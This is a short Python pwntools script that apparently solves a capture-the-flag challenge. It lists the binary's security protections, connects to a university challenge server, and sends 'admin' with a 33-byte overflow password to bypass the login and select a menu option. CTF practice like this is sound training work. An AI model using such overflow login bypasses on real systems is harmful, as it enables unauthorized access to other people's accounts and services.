'''CHECKSEC
Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
from pwn import *

biname = "./pl34s3_l0g1n"
#p = process(biname)
p = remote("cyberchallenge.diag.uniroma1.it", "5271")
p.recvuntil(b'Please Login')
p.recvuntil(b"Insert your Username: ")
p.send(b'admin\n')
p.recvuntil(b"Insert your Password: ")
p.send(b'A'*33)
p.send(b'\n')
p.send(b'3\n')

while True:
    print(p.recvline())